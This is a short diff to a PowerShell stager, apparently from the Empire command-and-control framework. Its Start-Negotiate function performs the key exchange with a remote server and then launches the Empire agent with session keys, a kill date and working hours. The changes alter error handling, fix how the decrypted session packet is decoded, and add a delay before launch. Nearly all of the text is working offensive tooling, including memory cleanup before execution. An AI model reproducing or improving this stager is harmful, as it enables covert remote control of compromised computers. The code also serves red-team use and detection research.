@@ -74,7 +74,7 @@ function Start-Negotiate {
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
 
     # try to ignore all errors
-    $ErrorActionPreference = "SilentlyContinue";
+    #$ErrorActionPreference = "SilentlyContinue";
     $e=[System.Text.Encoding]::UTF8;
     $customHeaders = "";
     $SKB=$e.GetBytes($SK);
@@ -193,7 +193,7 @@ function Start-Negotiate {
 
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
-    $de=$rs.decrypt($raw,$false);
+    $de=$e.getstring($rs.decrypt($raw,$false));
 
     # packet = server nonce + AES session key
     $nonce=$de[0..15] -join '';
@@ -327,6 +327,9 @@ function Start-Negotiate {
     # clear some variables out of memory and cleanup before execution
     $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
+
+    # need to give slack 10 seconds else it buckles and you hit the rate limits
+    Start-Sleep -Seconds 10;
 
     # TODO: remove this shitty $server logic
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
